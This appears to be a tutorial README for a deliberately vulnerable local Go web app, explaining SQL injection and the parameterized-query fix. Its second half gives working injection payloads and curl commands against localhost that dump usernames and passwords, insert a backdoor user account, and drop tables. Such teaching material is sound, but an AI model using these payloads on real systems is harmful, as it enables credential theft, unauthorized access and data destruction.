# What is SQL injection?

SQL injection is a vulnerability in a relational database client that allows a malicious actor to run unauthorized SQL commands against the database. This can be a big problem because it gives someone the ability to destroy important data, retrieve sensitive information, and create a backdoor into protected systems.

# How to identify a SQL injection vulnerability

Any time a SQL query is executed with variables and the variables are not properly escaped, this leaves an application open to SQL injection. For example:

```go
// String concatenation has the same vulnerability:
// query := "SELECT * FROM messages WHERE id = "  + params.ByName("id")
query := fmt.Sprintf("SELECT * FROM messages WHERE id = %s", params.ByName("id"))

if rows, err := db.Query(query); err != nil {
		return err
}
```

The code above selects rows from a table, but notice that the query string is being created directly via a string template, and there is nothing preventing someone from altering the SQL command. For example, instead of an ID, someone could pass in the string `1; DROP table messages; --`, which ends the initial select command, adds a new command, and comments out the remaining code, thereby destroying the data inside of the `messages` table.

# How to guard against SQL injection

Most programming languages have packages/libraries that make it easy to interact with the database of your choice. Each of these libraries will have methods that allow the application to execute parameterized queries, which will ensure that any variable that's being used to create a query string cannot be treated as a SQL command:

```go
// This query syntax is specific to a PostgreSQL database, where $1 is a placeholder for a parameter.
// If you are using a different database, please refer to its documentation for the correct syntax.
rows, err := db.QueryContext(ctx, "SELECT * FROM messages WHERE id = $1", params.ByName("id"))
if err != nil {
    return err
}
```

This method would ensure that if a user passes in `1; DROP table messages; --` as the value for the ID, the database would search for an ID matching "1; DROP table messages; --", rather than running the command against the database.


# How to hack into the database

## Listing the sensitive data in the users table

Notice that the code for `getMessages` in `main.go` doesn't give explicit access to the users table; however, it does give us access to user IDs, which can be used to retrieve the usernames and passwords for each user. The injected string would be something like this:

```sql
1 OR 1=1 UNION ALL SELECT id, 0 AS user_id, username || ' - ' || password FROM users --
```

Put together with the internal SQL query, the resulting command will look like this:

```sql
SELECT * FROM messages
WHERE
	id = 1 OR 1=1
UNION ALL
SELECT
	id,
	0 AS user_id,
	username || ' - ' || password
FROM users --
```

To break down each step of the query:
- `SELECT * FROM messages WHERE id = 1 or 1=1` logically translates to selecting all entries from the messages table.
- `UNION ALL SELECT id, 0 as user_id, username || ' - ' || password FROM users --` selects all entries from the users table and formats the row structure to match the messages table (i.e. integer and text), combines them with the message rows, and comments out the remaining code.

Because the entrypoint for the data is in the URL, the SQL statement will need to be [percent-encoded](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding). Below is the curl request that will retrieve the sensitive data from the users table:

```sh
curl \
	"http://localhost:3000/messages/1%20OR%201%3D1%20UNION%20ALL%20SELECT%20id%2C%200%20AS%20user_id%2C%20username%20%7C%7C%20'%20-%20'%20%7C%7C%20password%20FROM%20users%20--"
```

## Inserting a login for a malicious user into the users table

Just like the example above, the `sendMessage` method in the `main.go` file only gives explicit access to the messages table; however, we can still insert data into the users tables:

```sql
', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --
```

Put together with the internal SQL statement, the resulting command will look like this:

```sql
INSERT INTO messages (message, user_id)
VALUES ('', 1);
INSERT INTO users (username, password)
VALUES ('maliciousUser', 'p@$$w0rd'); --
```

To break down each step of the statement:
- `INSERT INTO messages (message, user_id) VALUES ('', 1);` inserts a blank message into the messages table.
- `INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --` inserts a new username and password into the users table and comments out the remaining code.

Because the entrypoint for the data is in the body of the request, the SQL statement will need to be sent as a string in the body of the request. Below is the curl request that will insert a malicious user into the users table:

```sh
curl \
	--request POST \
	--data-binary "', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --" \
	http://localhost:3000/message/1
```

## Destroying the table data in the database

Destroying the table data will be the exact same process as inserting a malicious user; however, the injected statement will be different:

```sql
', 1); DROP TABLE messages; DROP TABLE users; --
```

Put together with the internal SQL statement, the resulting command will look like this:

```sql
INSERT INTO messages (message, user_id)
VALUES ('', 1);
DROP TABLE messages; DROP TABLE users; --
```

The `DROP TABLE` statements will destroy the tables, resulting in the loss of all message and user data. Below is the curl request that will destroy the table data in the database:

```sh
curl \
	--request POST \
	--data-binary "', 1); DROP TABLE messages; DROP TABLE users; --" \
	http://localhost:3000/message/1
```